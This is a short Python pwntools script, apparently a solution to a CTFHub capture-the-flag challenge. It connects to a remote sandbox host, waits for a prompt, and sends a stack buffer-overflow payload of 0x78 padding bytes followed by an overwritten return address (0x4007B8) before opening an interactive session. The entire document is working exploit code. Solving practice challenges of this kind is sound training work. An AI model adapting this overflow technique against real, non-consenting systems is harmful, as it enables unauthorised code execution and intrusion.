from pwn import *

#io = process('./pwn')
io = remote('challenge-003c91a0bc938516.sandbox.ctfhub.com',36550)
payload = 0x78 * 'a' + p64(0x4007B8)
io.recvuntil('someting:\n')
io.sendline(payload)
io.interactive()


